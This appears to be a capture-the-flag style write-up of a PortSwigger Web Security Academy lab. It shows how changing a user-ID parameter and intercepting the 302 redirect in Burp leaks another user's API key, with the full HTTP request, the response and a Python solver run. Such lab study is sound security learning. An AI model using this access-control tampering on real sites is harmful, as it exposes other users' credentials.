# Lab: User ID controlled by request parameter with data leakage in redirect 

### Instructions

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

### Solution

Logging in to the provided account, our account page is at: `https://0af900e8045da52f8228079f00d6009e.web-security-academy.net/my-account?id=wiener`.

If we simply change `wiener` to `carlos` using the browser we are redirected back to the login page.

However if we try the same approach, but instead intercept this in Burp, we can discover Carlos' API key in the response:

Request:

```
GET /my-account?id=carlos HTTP/2
Host: 0af900e8045da52f8228079f00d6009e.web-security-academy.net
Cookie: session=PS0MM1APXrlKKDfyoeVeI0hdaoXI58hn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Response:

```html
HTTP/2 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3759

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User ID controlled by request parameter with data leakage in redirect</title>
    </head>
<SNIP>
    <div id=account-content>
        <p>Your username is: carlos</p>
        <div>Your API Key is: C3jAN5K2zWhZ8J5ic1xLPJAmseoIoh63</div>
```

We can submit this API key as our answer, which solves the lab.

### Python Solution

See `access_control_07.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_07_user_id_controlled_by_request_parameter_with_data_leakage_in_redirect]
└─$ python access_control_07.py https://0ad900890310a9458285b14000410000.web-security-academy.net/
[+] Logged in as wiener
[*] Retrieving Carlos' API key...
[+] Carlos' API key is: OLP0Hgd98gh44yv1w1HhmH4Bo8qjeTvP
[*] Submitting answer...
[+] Lab solved
```